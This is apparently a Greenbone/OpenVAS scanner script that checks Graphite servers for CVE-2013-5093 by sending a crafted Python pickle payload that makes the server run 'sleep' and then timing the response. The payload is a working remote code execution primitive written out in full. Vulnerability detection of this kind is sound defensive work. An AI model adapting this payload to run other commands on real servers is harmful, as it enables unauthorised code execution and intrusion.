# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103774");
  script_cve_id("CVE-2013-5093");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_version("2024-06-28T15:38:46+0000");

  script_name("Graphite RCE Vulnerability");


  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61894");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2013-08-22 17:46:22 +0200 (Thu, 22 Aug 2013)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successfully exploiting this issue will allow attackers to execute
arbitrary code within the context of the application.");
  script_tag(name:"vuldetect", value:"Try to execute the 'sleep' command by sending a special crafted HTTP
request and check how long the response take.");
  script_tag(name:"insight", value:"In graphite-web 0.9.5, a 'clustering' feature was introduced to
allow for scaling for a graphite setup. This was achieved by passing pickles
between servers. However due to no explicit safety measures having been
implemented to limit the types of objects that can be unpickled, this creates
a condition where arbitrary code can be executed");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"summary", value:"Graphite is prone to a remote code execution (RCE)
  vulnerability.");
  script_tag(name:"affected", value:"Graphite versions 0.9.5 through 0.9.10 are vulnerable.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
buf = http_get_cache(item:"/", port:port);

if("<title>Graphite Browser</title>" >!< buf)exit(0);

host = http_host_name(port:port);
url = '/render/local';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 500")exit(0);

sleep = make_list(3, 5, 10);

foreach i (sleep) {

  postData = 'line\ncposix\nsystem\np1\n(S\'sleep ' + i + '\'\np2\ntp3\nRp4\n.';

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host  + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Connection: close\r\n' +
        'Content-Length: ' + strlen(postData) + '\r\n' +
        '\r\n' +
        postData;


  start = unixtime();
  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();

  if(stop - start < i || stop - start > (i+5))exit(0);

}

security_message(port:port);
exit(0);
